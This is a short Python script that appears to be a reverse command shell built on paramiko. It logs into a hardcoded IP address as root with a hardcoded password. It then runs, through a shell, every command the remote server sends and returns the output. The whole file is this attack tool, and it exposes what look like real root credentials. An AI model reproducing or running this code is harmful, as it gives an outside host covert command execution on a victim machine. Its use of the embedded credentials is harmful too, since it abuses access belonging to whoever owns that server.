#!/usr/bin/env python3
# -*- coding: utf-8 -*-
""" @author zhangbohan.dell@gmail.com
    @function:
    @create 18-5-28 下午9:11"""

import paramiko
import subprocess
import threading


def ssh_command(ip, user, password, command):
    client = paramiko.SSHClient()
    # client.load_host_keys('/home/icecap/known_hosts')
    # paramiko支持如上密钥认证
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=user, password=password)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.exec_command(command)
        print(ssh_session.recv(1024))
        while True:
            command = ssh_session.recv(1024)
            # get the command from the SSH server
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)
            except Exception as e:
                ssh_session.send(str(e))
        client.close()

    return

    return


ssh_command('139.199.21.130', 'root', 'gj5846gj..', 'ClientConnected')
